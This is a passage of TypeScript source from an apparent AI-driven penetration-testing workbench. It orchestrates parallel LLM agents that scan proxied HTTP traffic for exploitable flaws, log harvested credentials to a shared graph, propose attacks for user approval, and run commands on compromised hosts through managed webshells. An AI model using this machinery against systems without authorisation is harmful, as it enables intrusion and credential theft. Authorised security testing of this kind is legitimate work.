    /crl\.(digicert|comodoca|globalsign)\./,                       // CRL 吊销列表
    // ---- Firefox/Edge 内置遥测与系统流量（旧实例日志实证样本） ----
    /\.services\.mozilla\.com\//,                // Firefox 设置同步/地理位置/追踪保护列表（firefox.settings/location/shavar.*）
    /\.cdn\.mozilla\.net\//,                     // Firefox 设置附件/内容签名/远程配置 CDN
    /detectportal\.firefox\.com/,                // Firefox 网络连通性探测（captive portal）
    /firefox-settings\.mozilla-backup\.org/,     // Firefox 设置备份域
    /mozilla-ohttp\.fastly-edge\.com/,           // Firefox OHTTP 隐私网关
    /aus5\.mozilla\.org/,                        // Firefox 更新服务器
    /normandy\.(cdn\.)?mozilla\.(org|net)/,      // Firefox Normandy 实验/特性开关
    /snippets\.cdn\.mozilla\.net/,               // Firefox 新标签页摘要
    /accounts\.firefox\.com/,                    // Firefox 账户同步
    /shavar\.services\.mozilla\.com/,            // Firefox 跟踪保护列表（Safe Browsing 分流）
    /incoming\.telemetry\.mozilla\.org/,         // Firefox 遥测上报
    /firefox\.cloud\.mozilla\.com/,              // Firefox 云
  ]

  /** 本机工件/客户端请求头噪音特征：分析出的"敏感项"命中则视为非目标泄漏（脏情报不入图） */
  private static readonly LOCAL_ARTIFACT_RE = /(C:\\Users\\[^\\"'\s]+|\/Users\/[^\/"'\s]+|windows\/system32|localhost(?::\d+)?|127\.0\.0\.1|Proxy-Connection|Accept-Encoding|Accept-Language|Upgrade-Insecure-Requests|^Sec-Fetch-|Connection\s*:\s*keep-alive|User-Agent\s*:\s*curl)/i

  private isBrowserBuiltin(detail?: unknown, url?: string): boolean {
    const s = (typeof detail === 'string' ? detail : JSON.stringify(detail ?? '')) + ' ' + (url ?? '')  // url 参与匹配（detail 无路径时黑名单 URL 规则仍命中）
    if (!s.trim()) return false
    return ApiServer.BROWSER_TRAFFIC.some((re) => re.test(s))
  }

  /** HermesPentBox 自身流量（WebShell 命令执行 / Repeater 等）：请求带 x-pentbox-source 标记头 → 跳过 Agent 审计 */
  private isPentboxOwnTraffic(detail?: unknown): boolean {
    const reqHeaders = (detail as { reqHeaders?: Record<string, string> })?.reqHeaders
    if (reqHeaders) {
      const src = String(reqHeaders['x-pentbox-source'] || '').toLowerCase()
      if (src === 'webshell' || src === 'repeater') return true
    }
    const s = typeof detail === 'string' ? detail : JSON.stringify(detail ?? '')
    return /x-pentbox-source[":]?\s*["']?(webshell|repeater)/i.test(s)
  }

  // ---------------- 本地 Hermes 分析器（CLI 子进程；独立档案 HermesPentBox + 10 槽会话负载均衡） ----------------
  private hermesCli = join(homedir(), 'AppData', 'Local', 'hermes', 'hermes-agent', 'venv', 'Scripts', 'hermes.exe')
  /** HermesPentBox 独立档案目录（SOUL.md 猎隼 persona + memories/user.md 用户画像；所有会话落此档案） */
  private hermesHome = join(homedir(), 'AppData', 'Local', 'hermes', 'profiles', 'hermespentbox')
  /** spawn 时注入 HERMES_HOME → 分析/对话会话都在 HermesPentBox 档案之下；HTTP(S)_PROXY 指向本应用代理（子 Agent 渗透流量必须经过应用），NO_PROXY 排除模型 API 域名（模型调用直连不走代理）；TMPDIR/TEMP/TMP + cwd 指向系统临时目录（Agent 所有临时文件落临时目录，不污染工作目录） */
  private hermesEnv = {
    ...process.env,
    HERMES_HOME: join(homedir(), 'AppData', 'Local', 'hermes', 'profiles', 'hermespentbox'),
    HTTP_PROXY: 'http://127.0.0.1:8899',
    HTTPS_PROXY: 'http://127.0.0.1:8899',
    NO_PROXY: 'api.minimaxi.com,api.deepseek.com,localhost',
    no_proxy: 'api.minimaxi.com,api.deepseek.com,localhost',
    TMPDIR: tmpdir(),
    TEMP: tmpdir(),
    TMP: tmpdir(),
  }
  /** Agent spawn 统一工作目录：系统临时目录（临时文件不落项目目录） */
  private agentCwd = tmpdir()
  /** 渗透执行窗口：期间经代理的流量直接标记跳过（不再次送子 Agent 审计，防循环） */
  private penetrating = false

  /** 确保独立档案存在：无 hermespentbox 档案则自动创建（clone 配置保留模型）并写入猎隼 persona + 用户画像 */
  private async ensureHermesProfile(): Promise<void> {
    try {
      if (existsSync(join(this.hermesHome, 'SOUL.md'))) return  // 档案已就绪
      console.log('[pentbox] hermespentbox 档案不存在，自动创建…')
      await new Promise<void>((resolve) => {
        const child = spawn(this.hermesCli, ['profile', 'create', 'hermespentbox', '--clone'], { env: this.hermesEnv, cwd: this.agentCwd, windowsHide: true })
        child.on('close', () => resolve())
      })
      mkdirSync(this.hermesHome, { recursive: true })
      writeFileSync(join(this.hermesHome, 'SOUL.md'), SOUL_PERSONA)
      mkdirSync(join(this.hermesHome, 'memories'), { recursive: true })
      writeFileSync(join(this.hermesHome, 'memories', 'user.md'), USER_PROFILE)
      console.log('[pentbox] hermespentbox 档案创建完成（SOUL.md + memories/user.md）')
    } catch (e) {
      console.error('[pentbox] 档案创建失败:', String(e).slice(0, 200))
    }
  }

  /** 确保内置红队技能库就位：档案 skills 无 hacker-* 技能时，从应用内置 assets/hack-skills 复制（102 个技能） */
  private ensureSkills(): void {
    try {
      const dst = join(this.hermesHome, 'skills')
      if (existsSync(join(dst, 'hacker-web-injection'))) return  // 已就位
      const src = join(process.cwd(), 'assets', 'hack-skills')
      if (!existsSync(src)) { console.warn('[pentbox] 内置技能库缺失:', src); return }
      const { cpSync } = require('node:fs') as typeof import('node:fs')
      mkdirSync(dst, { recursive: true })
      cpSync(src, dst, { recursive: true })
      console.log('[pentbox] 内置红队技能库已就位（102 技能）')
    } catch (e) {
      console.error('[pentbox] 技能库复制失败:', String(e).slice(0, 200))
    }
  }
  /** 本地 Hermes 在线状态（后端每 5s 探测，供 UI 实时刷新 HERMES AGENT 状态） */
  private hermesOnline = false
  private probeHermes(): void {
    // 工作台 Agent 功能（对话/分析/渗透/steer）依赖自研 Agent Bridge（28766）+ hermes CLI。
    // 状态正确判定：CLI 存在 && bridge 可连 → active；否则 offline。
    if (!existsSync(this.hermesCli)) { this.hermesOnline = false; return }
    let done = false
    const set = (v: boolean) => { if (!done) { done = true; this.hermesOnline = v } }
    // 探测自研 Agent Bridge 端口（对话/分析/渗透/steer 实际依赖）
    const s = connect({ host: '127.0.0.1', port: this.bridgePort, timeout: 800 })
    s.once('connect', () => { s.destroy(); set(true) })
    s.once('error', () => s.destroy())
    s.once('timeout', () => s.destroy())
    s.setTimeout(800)
    // 探测失败 → offline；同时若 CLI 存在且 bridge 未运行，触发一次拉起（ensureBridge 幂等）
    setTimeout(() => {
      if (done) return
      set(false)
      this.ensureBridge().catch(() => {})
    }, 900)
  }
  private hermesSessionId: string | null = null
  private hermesBusy = false
  /** 10 个子 Agent 独立会话槽（并行分析互不干扰；每槽 --resume 各自累积上下文） */
  private analyzeSlots: (string | null)[] = new Array(ApiServer.MAX_PARALLEL).fill(null)
  /** 每槽当前 in-flight 数（负载均衡：新流量分给最空闲的子 Agent，最少连接算法） */
  private slotBusy: number[] = new Array(ApiServer.MAX_PARALLEL).fill(0)
  /** 进行中的渗透子 Agent 进程（slot → child，供 /api/penetrate/cancel 杀进程） */
  private penetrateChildren = new Map<number, ReturnType<typeof spawn> | (() => void)>()

  // ---------------- 图变更实时广播（Neo4j 写入 → steer 注入所有运行中的 Agent 会话） ----------------
  /** 2 秒节流窗口内待广播的图变更摘要（合并多条为一条，防刷屏） */
  private graphBroadcastBuf: string[] = []
  private graphBroadcastTimer: ReturnType<typeof setTimeout> | null = null
  /** 图写入成功后调用：记录变更摘要并节流广播到主 Agent + 全部子 Agent 槽（仅运行中会话接收，空闲自动 rejected） */
  private broadcastGraphChange(summary: string): void {
    if (!this.bridgeReady) return
    this.graphBroadcastBuf.push(summary)
    if (this.graphBroadcastBuf.length > 8) this.graphBroadcastBuf.shift()  // 单窗口最多 8 条，防上下文刷爆
    if (this.graphBroadcastTimer) return
    this.graphBroadcastTimer = setTimeout(() => {
      this.graphBroadcastTimer = null
      const batch = this.graphBroadcastBuf.splice(0)
      if (!batch.length) return
      const text = `（图实时更新）Neo4j 情报图刚新增以下条目，供你更新认知（无需回复，勿中断当前工作）：\n${batch.join('\n')}`
      const targets = new Set<string>()
      if (this.chatSessionId) targets.add(this.chatSessionId)
      for (const sid of this.analyzeSlots) if (sid) targets.add(sid)
      for (const sid of targets) {
        this.bridge.steer(sid, text, 'hermespentbox').catch(() => {})
      }
    }, 2000)
  }

  /** 与本地 Hermes 对话（异步 spawn；独立会话——分析 10 槽并行时共享会话会锁冲突导致进程崩溃；回复过滤 CLI 日志） */
  private chatSessionId: string | null = null
  /** 通用 hermes 单轮调用：resume 指定会话（可空=新会话），onSid 回调拿到新会话 id，onSpawn 回调拿到子进程（供取消杀进程），tailLines 控制回复截断行数（VULNDOC 需放宽） */
  private runHermes(message: string, resume?: string | null, onSid?: (sid: string) => void, onSpawn?: (child: ReturnType<typeof spawn>) => void, tailLines = 12): Promise<string> {
    const args = ['chat', '-q', message, '-Q', '--source', 'pentbox-chat']
    if (resume) args.push('--resume', resume)
    return new Promise((resolve) => {
      const child = spawn(this.hermesCli, args, { timeout: 240000, env: this.hermesEnv, cwd: this.agentCwd, windowsHide: true })
      onSpawn?.(child)
      let out = ''
      child.stdout.on('data', (b) => { out += b })
      child.stderr.on('data', (b) => { out += b })
      child.on('error', (e) => resolve(`（Agent 进程启动失败：${e.message}）`))
      child.on('close', () => {
        const sid = out.match(/session_id:\s*(\S+)/)?.[1]
        if (sid) onSid?.(sid)
        // 回复 = 输出尾部（去 CLI 日志/session_id 行）；空输出给明确错误（不静默"（无回复）"）
        const clean = out.split('\n').filter((l) => !/session_id:\s*\S+/.test(l)).join('\n').trim()
        if (!clean) { resolve('（Agent 无响应：进程无输出，可能模型端点不可达 / API Key 无效 / 请求超时）'); return }
        const tail = clean.split('\n').slice(-tailLines).join('\n')
        resolve(tail.length > 6000 ? tail.slice(-6000) : tail)
      })
    })
  }
  /** 应用工具能力引导（注入主聊天）：Agent 可直接主动调用这些 HTTP 接口（执行接口已由应用封装） */
  private toolsHint(): string {
    const ws = this.webshells
    const lines: string[] = [
      '【应用工具能力】以下接口是工作台提供的 Agent 直连能力，你可主动调用（execute_code 里用 python urllib，或 terminal 用 curl），不必等用户代为操作：',
      '· 主动查全局情报图（站点地图/漏洞/凭据/WebShell/每接口分析结论，多 Agent 共享）：GET http://localhost:8877/api/graph/query （文本）；加 ?format=json 得结构化 JSON（含 analysis 结论）；加 ?host=192.168.6.133:8080 只看该主机',
      '· 查看当前流量面板（应用代理实时捕获的 HTTP 流量：方法/URL/状态码/时间）：GET http://localhost:8877/api/flows?limit=30 ；加 &full=1 返回最近请求的完整请求/响应报文',
      '· 主动记录情报到图（共享给其他 Agent，非破坏性）：POST http://localhost:8877/api/graph/note ，body={"host":"192.168.6.133:8080","path":"/x.php","text":"发现内容","level":"high|medium|low|info"}',
      '· 登录凭据等敏感信息：同样用 /api/graph/note 记录（text 含 用户名/密码/令牌），level 标 high',
    ]
    if (ws.length) {
      lines.push(`· WebShell 管理（当前 ${ws.length} 个）：命令执行 POST http://localhost:8877/api/webshells/exec ，body={"id":N,"command":"cmd"} → {"ok":true,"output":"..."}（加解密握手已封装，密钥勿自行构造）`)
      for (const w of ws.slice(0, 10)) lines.push(`   id=${w.id} | ${w.url} | ${w.type || 'custom'}/${w.script || '?'} | ${w.status || 'unknown'} | pass=${w.password ? '***' : '(空)'} key=${w.key ? '***' : '(空)'}`)
    }
    lines.push('约束：以上接口仅用于读取情报、记录分析结论与执行命令；删除/覆盖现有数据属破坏性操作，须先征得用户同意。')
    return lines.join('\n') + '\n\n'
  }

  /** 子 Agent（流量分析槽）精简工具引导：分析中可主动查/写图（完整工具列表见主聊天 toolsHint） */
  private static readonly SUB_TOOL_HINT = '【图工具】你可主动调 http://localhost:8877/api/graph/query（?format=json 得结构化，?host= 过滤主机）查全局情报图；发现需共享的情报用 POST /api/graph/note {"host":"..","path":"..","text":"..","level":"..."} 记录（凭据/敏感信息 level 标 high）。仅读取与记录，禁止删改。\n\n'

  private hermesChat(message: string, gctx?: string, hint?: string): Promise<string> {
    const mid = [gctx, hint].filter(Boolean).join('\n')
    const input = mid ? `${mid}【用户消息】${message}` : message
    // 统一走 Agent Bridge 通道（与流式聊天同一命名空间/会话指针），避免 CLI runHermes 的 session_id 污染 chatSessionId
    return this.bridgeAsk(input, this.chatSessionId, {
      onDone: (sid) => { this.chatSessionId = sid },
    }, true)
  }

  /** 调本地 Hermes 分析一条流量（Agent Bridge 并行会话，不阻塞主进程）：每槽独立 bridge 会话续传上下文；返回含 slot（提出意见的子 Agent 槽位） */
  private async hermesAnalyze(detail: unknown): Promise<{ vuln: boolean; level: string; sensitive: { type: string; value: string; level: string }[]; advice: string; slot: number }> {
    const d = (detail ?? {}) as Record<string, unknown>
    const digest = await this.digestPrompt()
    const prompt = digest + ApiServer.SUB_TOOL_HINT + '分析以下 HTTP 流量（完整请求/响应）：\n1. 判断是否存在可利用的安全漏洞；\n2. 从报文中提取敏感信息/指纹/线索，type 必须从以下 HaENet 标签清单中精确选择（每个 type 自带固定危害等级；清单外的 type 禁止使用）：\n' + haeTagList() + '\n3. 若存在可利用漏洞（vuln=true），输出渗透意见 advice，格式必须为："经 Hermes 分析 <API路径> 可进行 <攻击方式> 渗透，是否进行"（攻击方式用具体手法：SQL 注入/未授权访问/SSRF/暴力破解/越权等）。注意：vuln=true 时 advice 必填，禁止输出空字符串。\n只输出一行 JSON，格式：{"vuln": true或false, "level": "high|medium|low|info", "sensitive": [{"type": "标签名", "value": "值"}], "advice": "渗透意见或空"}。level 为整体危害等级。无漏洞时 advice 为空字符串。\n\n【请求】\n' +
      `${d.reqLine ?? ''}\n${((d.reqRawHeaders as string[]) ?? []).join('\n')}\n\n${d.reqBody ?? ''}\n\n【响应】\n${d.resLine ?? ''}\n${((d.resRawHeaders as string[]) ?? []).join('\n')}\n\n${String(d.resBody ?? '').slice(0, 4000)}`
    // 负载均衡：选当前最空闲的子 Agent 槽（最少连接算法），而非静态轮转
    // 渗透中的槽 + 已提出渗透意见卡待决策的槽 不接新流量分析（Agent 专注渗透/等待决策；取消/完成/卡片关闭后再恢复分配）
    const busy = this.slotBusy.map((v, i) => (this.penetrateTargets.has(i) || this.pendingAdviceSlots.has(i) ? Infinity : v))
    const slot = busy.indexOf(Math.min(...busy))
    this.slotBusy[slot]++
    const sid = this.analyzeSlots[slot]  // bridge 会话 id（首次 null → 自动新建）
    return this.bridgeAsk(prompt, sid, {
      onDone: (newSid) => { this.analyzeSlots[slot] = newSid },
    }).then((out) => {
      this.slotBusy[slot]--
      const p = this.extractJson(out)
      const sens: { type: string; value: string; level: string }[] = Array.isArray(p?.sensitive) ? p.sensitive.filter((s: unknown) => s && typeof s === 'object' && (s as { value?: unknown }).value != null).map((s) => {
        const rawType = String((s as { type?: unknown }).type ?? 'All URL')
        // HaENet 标签归一：精确命中注册表 → type 用注册表 key；未命中尝试大小写/别名模糊匹配；仍不中 → 保留原样（前端灰显）
        // 注意：HAE_TAGS[key] 返回 meta 对象（level/group/color），不能当作 type 用
        const exactKey = Object.prototype.hasOwnProperty.call(HAE_TAGS, rawType.trim()) ? rawType.trim() : null
        const tag = exactKey || Object.keys(HAE_TAGS).find((k) => k.toLowerCase() === rawType.trim().toLowerCase())
        const meta = (tag && HAE_TAGS[tag]) || null
        return { type: tag || rawType.trim(), value: String((s as { value?: unknown }).value).slice(0, 200), level: meta?.level ?? 'info' }
      }) : []
      const overall = (p?.level && ['high', 'medium', 'low', 'info'].includes(p.level)) ? p.level : 'info'
      // 整体等级提升：任一标签等级高于模型输出的 overall 时以标签等级为准（HaENet fixed-level 兜底模型低估）
      const maxTag = sens.reduce((m, s) => (['high', 'medium', 'low', 'info'].indexOf(s.level) < ['high', 'medium', 'low', 'info'].indexOf(m) ? s.level : m), overall)
      let advice = p && typeof p.advice === 'string' && p.advice ? p.advice.slice(0, 300) : ''
      // 兜底：模型判有漏洞但 advice 空（输出不稳定）→ 用请求路径生成渗透意见（保证意见卡出现）
      if (p?.vuln && !advice) {
        const pm = String(d.reqLine ?? '').match(/\S+\s+(\S+)/)
        advice = `经 Hermes 分析 ${pm ? pm[1] : '目标'} 可进行 安全测试 渗透，是否进行`
      }
      // 本机工件/客户端噪音过滤：分析里的"敏感项"若是本机信息或标准请求头，不是目标泄漏 → 剔除（避免脏情报入图）
      const clean = sens.filter((s) => !ApiServer.LOCAL_ARTIFACT_RE.test(s.value) && !ApiServer.LOCAL_ARTIFACT_RE.test(s.type))
      if (clean.length !== sens.length) console.log(`[analyze] 过滤本机/客户端噪音敏感项 ${sens.length - clean.length} 条`)
      return { vuln: p ? !!p.vuln : false, level: maxTag, sensitive: clean, advice, slot }
    }).catch((e) => {
      this.slotBusy[slot]--
      throw e
    })
  }

  /** 从 LLM 输出提取首个完整 JSON（括号配对，容忍前后杂文） */
  private extractJson(text: string): Record<string, unknown> | null {
    const i = text.indexOf('{')
    if (i < 0) return null
    let depth = 0
    let inStr = false
    for (let j = i; j < text.length; j++) {
      const c = text[j]
      if (inStr) { if (c === '\\') j++; else if (c === '"') inStr = false; continue }
      if (c === '"') inStr = true
      else if (c === '{') depth++
      else if (c === '}') { depth--; if (depth === 0) { try { return JSON.parse(text.slice(i, j + 1)) } catch { return null } } }
    }
    return null
  }

  /** 目标 URL 统一规范化 key（P0：发卡去重/渗透前查重/成果写入三处共用，保证格式一致）：
   * 去协议、host 小写、保留端口（显式时）+ 路径 + 查询参数；如 https://EXAMPLE.com:8443/api/login?x=1 → example.com:8443/api/login?x=1 */
  private normalizeTargetKey(input: string): string {
    if (!input) return ''
    try {
      const u = new URL(input.includes('://') ? input : `http://${input}`)
      const host = (u.hostname || '').toLowerCase()
      const port = u.port ? `:${u.port}` : ''
      return `${host}${port}${u.pathname}${u.search}`
    } catch {
      return input.replace(/^https?:\/\//i, '').toLowerCase()
    }
  }

  /** 从 URL 提取 host（含端口），用于按目标关联情报 */
  private hostOf(url: string): string {
    try { return new URL(url).host } catch { return '' }
  }

  /** 写入全局情报（持久条目不淘汰；滚动条目仅保留最近 20 条非持久流水；标签元数据随条目落图） */
  private pushDigest(entry: DigestEntry): void {
    // 写 Neo4j 情报图（会话内容共享核心）
    if (this.graph.enabled) {
      const host = entry.host || ''
      const path = entry.path || ''
      if (entry.kind === 'cred') {
        this.graph.writeCred({ type: entry.data.split(':')[0] || 'unknown', value: entry.data.split(':').slice(1).join(':') || entry.data, host, path, source: 'agent', tag: entry.tag, group: entry.group, level: entry.level, color: entry.color }).catch(() => {})
        this.broadcastGraphChange(`新凭据 [${entry.tag || entry.data.split(':')[0] || '?'}](${entry.level || 'high'}) ${host}${path}: ${String(entry.data.split(':').slice(1).join(':') || '').slice(0, 60)}`)
      }
      else if (entry.kind === 'penetrating' || entry.kind === 'penetrated' || entry.kind === 'cancelled') {
        const method = (entry.data.match(/渗透（(.+)）/) || [])[1] || ''
        this.graph.writePenetration({ host, path, method, status: entry.kind === 'penetrating' ? 'penetrating' : entry.kind === 'cancelled' ? 'cancelled' : 'penetrated' }).catch(() => {})
        this.broadcastGraphChange(`渗透状态 ${entry.kind}: ${host}${path}（${method || '?'}）— ${entry.data.slice(0, 80)}`)
      }
      else {
        this.graph.writeNote({ kind: entry.kind, text: entry.data, host, path, persist: entry.persist, tag: entry.tag, group: entry.group, level: entry.level, color: entry.color }).catch(() => {})
        this.broadcastGraphChange(`[${entry.tag || entry.kind}](${entry.level || 'info'}) ${host}${path}: ${entry.data.slice(0, 80)}`)
      }
    }
    // 内存降级缓存（Neo4j 不可用时兜底；Neo4j 可用时仅作即时查重辅助）
    this.analysisDigest.push(entry)
    // 滚动条目窗口：持久条目保留，非持久只留最近 20 条
    const roll = this.analysisDigest.filter((e) => !e.persist)
    if (roll.length > 20) {
      const dropCount = roll.length - 20
      let dropped = 0
      this.analysisDigest = this.analysisDigest.filter((e) => {
        if (e.persist || dropped >= dropCount) return true
        dropped++
        return false
      })
    }
    // 全局 digest 总量上限（防 token 失控）：持久条目最多 60 条
    const pers = this.analysisDigest.filter((e) => e.persist)
    if (pers.length > 60) {
      const overflow = pers.length - 60
      let dropped = 0
      this.analysisDigest = this.analysisDigest.filter((e) => {
        if (!e.persist || dropped >= overflow) return true
        dropped++
        return false
      })
    }
  }

  /** 移除全局情报条目（按 kind+host+path 精确匹配；进行中渗透/临时标记移除用） */
  private removeDigest(kind: DigestEntry['kind'], host: string, path: string): void {
    this.analysisDigest = this.analysisDigest.filter((e) => !(e.kind === kind && e.host === host && e.path === path))
    if (this.graph.enabled) this.graph.removePenetration(host, path, '').catch(() => {})
  }

  /** 渲染全局情报注入文本：优先 Neo4j 会话图查询，Neo4j 不可用时降级内存 digest */
  private async digestPrompt(): Promise<string> {
    if (this.graph.enabled) {
      const g = await this.graph.contextPrompt()
      if (g) return g
    }
    if (!this.analysisDigest.length) return ''
    const pers = this.analysisDigest.filter((e) => e.persist)
    const roll = this.analysisDigest.filter((e) => !e.persist)
    const lines: string[] = []
    if (pers.length) {
      lines.push('【持久情报】（已确认/高价值，全生命周期保留）')
      for (const e of pers) lines.push(`  [${e.kind}] ${e.host}${e.path}：${e.data}`)
    }
    if (roll.length) {
      lines.push('【最近分析流水】')
      for (const e of roll) lines.push(`  [${e.kind}] ${e.host}${e.path}：${e.data}`)
    }
    return `【全局情报】多 Agent 战况共享：\n${lines.join('\n')}\n（结合这些情报判断当前流量是否与已知发现关联、是否同一目标的其他风险面）\n\n`
  }

  /** 分析消费泵（并发 10 个子 Agent）：队列取 → 本地 Hermes 并行分析（10 槽独立会话）→ 写回；单条失败跳过不阻塞 */
  private inFlight = 0
  private static readonly MAX_PARALLEL = 10
  private startAnalyzeLoop(): void {
    setInterval(() => {
      while (this.inFlight < ApiServer.MAX_PARALLEL && this.analyzeQueue.length) {
        const id = this.analyzeQueue.shift()!
        const st = this.analyzeMap.get(id)
        if (!st || st.state === 'done') continue
        st.state = 'analyzing'
        this.inFlight++
        this.hermesAnalyze(st.detail)
          .then((r) => {
            st.state = 'done'; st.vuln = r.vuln; st.level = r.level; st.sensitive = r.sensitive
            const u = st.url || ''
            const host = this.hostOf(u)
            const path = u.replace(/^https?:\/\/[^/]+/i, '') || ''
            // 整合落图：分析结论挂到与站点地图相同的 Api 节点链上（Host→Api→ANALYZED→Analysis）
            if (host) {
              const dm = (st.detail as { reqLine?: string } | undefined)?.reqLine?.match(/^(\S+)/)
              const sensTxt = (r.sensitive || []).map((s) => `${s.type}:${String(s.value).slice(0, 40)}`).join('; ').slice(0, 400)
              // 条目颜色 = 最高敏感等级色（HAE fixed level，与前端行染色同源）
              const lvOrder = ['info', 'low', 'medium', 'high']
              const maxLv = (r.sensitive || []).reduce((m, s) => (lvOrder.indexOf(s.level ?? 'info') > lvOrder.indexOf(m) ? (s.level ?? 'info') : m), 'info')
              this.graph.writeAnalysis({ host, path: path || '/', method: dm ? dm[1] : 'GET', level: r.level, vuln: r.vuln, advice: (r.advice || '').slice(0, 200), sens: sensTxt, sensCount: (r.sensitive || []).length, color: HAE_LEVEL_COLOR[maxLv] }).catch(() => {})
            }
            // 全局情报 digest（结构化分层）：
            // 1) 漏洞/分析结论 → 滚动流水（20 条窗口）
            if (r.vuln || r.advice) {
              this.pushDigest({ kind: 'vuln', host, path, data: `${r.vuln ? `漏洞(${r.level})` : '分析'}:${(r.advice || '').slice(0, 80)}`, persist: false })
            }
            // 2) 敏感凭据 → 持久情报（全生命周期保留，子 Agent 共享杠杆）+ 自动凭据利用意见卡（HAE_CRED_TAGS 判定凭据类标签）
            for (const s of r.sensitive || []) {
              const t = String(s.type || '').trim()
              const isCred = HAE_CRED_TAGS.has(t)
              const credHost = host || '未知'
              const tagMeta = HAE_TAGS[t]
              if (isCred) {
                this.pushDigest({ kind: 'cred', host: credHost, path, data: `${t}:${String(s.value).slice(0, 200)}`, persist: true, tag: t, group: tagMeta?.group, level: (s.level as DigestEntry['level']) || tagMeta?.level || 'high', color: tagMeta?.color })
                // 凭据自动意见：攻击凭据是最高价值杠杆 → 自动推"凭据利用"意见卡（不打断分析）
                if (u) {
                  const credKey = `${this.normalizeTargetKey(u)}|凭据利用`
                  if (!this.advisedKeys.has(credKey) && !this.penetratedKeys.has(credKey) && !this.penetratingKeys.has(credKey)) {
                    this.pushSse({ type: 'analyze-advice', id, advice: `经 Hermes 分析 ${path || u} 可进行 凭据利用 渗透，是否进行`, level: s.level || 'high', slot: r.slot })
                    this.advisedKeys.add(credKey)
                    this.pendingAdviceSlots.add(r.slot)
                  }
                }
              }
            }
            // 3) 非凭据标签（指纹/基础信息/潜在漏洞/其他）→ 滚动流水（带 HaENet 标签与等级）
            for (const s of r.sensitive || []) {
              const t = String(s.type || '').trim()
              if (!HAE_CRED_TAGS.has(t)) {
                const lv = s.level || 'info'
                const tagMeta = HAE_TAGS[t]
                const data = `${t}(${lv}${tagMeta ? '/' + tagMeta.cn : ''}):${String(s.value).slice(0, 60)}`
                this.pushDigest({ kind: t.includes('Nday') || t.includes('nday') ? 'nday' : 'note', host, path, data, persist: false, tag: t, group: tagMeta?.group, level: (lv as DigestEntry['level']) || tagMeta?.level || 'info', color: tagMeta?.color })
              }
            }
            // 渗透意见 → SSE 推送（前端 Hermes Agent 聊天框渲染意见卡：进行/取消/回复；slot 绑定提出意见的子 Agent，进行渗透由该子 Agent 执行）
            // 发卡去重（统一 key：normalizeTargetKey 规范化 Host+完整路径+查询 | 方式）：
            // 同 URL 同方式已推送过（advisedKeys）/ 已渗透过（penetratedKeys）/ 正在渗透（penetratingKeys）→ 不再推送；不同方式可再推
            if (r.advice) {
              const u = st.url || ''
              const pm = r.advice.match(/可进行\s*(.+?)\s*渗透/)?.[1] || ''
              const key = u ? `${this.normalizeTargetKey(u)}|${pm}` : ''
              if (key && !this.advisedKeys.has(key) && !this.penetratedKeys.has(key) && !this.penetratingKeys.has(key)) {
                this.pushSse({ type: 'analyze-advice', id, advice: r.advice, level: r.level, slot: r.slot })
                this.advisedKeys.add(key)
                this.pendingAdviceSlots.add(r.slot)  // 提出卡片 → 暂停该槽流量分析（等用户决策渗透/取消）
              }
            }
          })
          .catch((e) => { console.error('[analyze] hermes 分析失败:', String(e.message ?? e).slice(0, 200)); st.state = 'done'; st.vuln = false; st.level = 'info' })
          .finally(() => { this.inFlight-- })
      }
    }, 300)
  }

  // ---------------- 漏洞库（Agent 可增删改查；JSON 文件持久化） ----------------
  private vulns: Vuln[] = []
  private vulnSeq = 0
  private vulnFile = ''
  // ---------------- WebShell 管理（CRUD 持久化 ~/.pentbox/webshells.json；exec/ping 经内置代理发出，流量可被面板捕获） ----------------
  private webshells: { id: number; type: string; script: string; url: string; password: string; key: string; status: string; ts: number; cryption?: string; payload?: string; encoding?: string; headers?: string; reqLeft?: string; reqRight?: string; connTimeout?: number; readTimeout?: number; remark?: string }[] = []
  private wsSeq = 0
  /** Suo5 正向代理进程（HTTP 隧道，本地 SOCKS5） */
  private suo5Proc: { proc: ReturnType<typeof spawn>; port: number; url: string } | null = null
  private wsFile = ''
  /** WebShell 会话 cookie（按 URL 保持 PHPSESSID，哥斯拉/冰蝎握手+执行需同一 session） */
  private wsCookies = new Map<string, string>()
  private loadWebshells(): void {
    try {
      this.wsFile = join(homedir(), '.pentbox', 'webshells.json')
      if (existsSync(this.wsFile)) {
        const data = JSON.parse(readFileSync(this.wsFile, 'utf8')) as typeof this.webshells
        this.webshells = Array.isArray(data) ? data : []
        this.wsSeq = this.webshells.reduce((m, v) => Math.max(m, v.id), 0)
      }
    } catch { this.webshells = [] }
  }
  private saveWebshells(): void {
    try { mkdirSync(dirname(this.wsFile), { recursive: true }); writeFileSync(this.wsFile, JSON.stringify(this.webshells, null, 2)) } catch { /* 落盘失败不阻断 */ }
  }

  private loadVulns(): void {
    try {
      const { homedir } = require('node:os') as typeof import('node:os')
      const { join } = require('node:path') as typeof import('node:path')
      const { existsSync, readFileSync } = require('node:fs') as typeof import('node:fs')
      this.vulnFile = join(homedir(), '.pentbox', 'vulns.json')
      if (existsSync(this.vulnFile)) {
        const data = JSON.parse(readFileSync(this.vulnFile, 'utf8')) as Vuln[]
        this.vulns = Array.isArray(data) ? data : []
        this.vulnSeq = this.vulns.reduce((m, v) => Math.max(m, v.id), 0)
      }
    } catch { this.vulns = [] }
  }

  /** 下游代理持久化文件（~/.pentbox/downstream.json）：启动恢复，运行时 PUT 更新 */
  private dsFile = ''
  private loadDownstream(): void {
    try {
      const { homedir } = require('node:os') as typeof import('node:os')
      const { join } = require('node:path') as typeof import('node:path')
      const { existsSync, readFileSync } = require('node:fs') as typeof import('node:fs')
      this.dsFile = join(homedir(), '.pentbox', 'downstream.json')
      if (existsSync(this.dsFile)) {
        const d = JSON.parse(readFileSync(this.dsFile, 'utf8')) as { host?: string; port?: number; protocol?: 'http' | 'socks5' }
        if (d?.host && d.port && Number(d.port) > 0) {
          this.engine.setDownstream({ host: String(d.host).trim(), port: Number(d.port), protocol: d.protocol === 'socks5' ? 'socks5' : 'http' })
        }
      }
    } catch { /* 无下游配置或读取失败 → 直连 */ }
  }

  private saveVulns(): void {
    try {
      const { writeFileSync, mkdirSync } = require('node:fs') as typeof import('node:fs')
      const { dirname } = require('node:path') as typeof import('node:path')
      mkdirSync(dirname(this.vulnFile), { recursive: true })
      writeFileSync(this.vulnFile, JSON.stringify(this.vulns, null, 2))
    } catch { /* 落盘失败不阻断 */ }
  }

  /** 从漏洞 uri 拆分出图用的 host / path（无 uri 或格式非法返回空串，不上图） */
  private splitVulnUri(uri: string): { host: string; path: string } {
    if (!uri) return { host: '', path: '' }
    const m = uri.match(/^(https?:\/\/[^/?#]+)([/?#].*)?$/i)
    if (!m) return { host: '', path: '' }
    const host = m[1] || ''
    const rawPath = m[2] || '/'
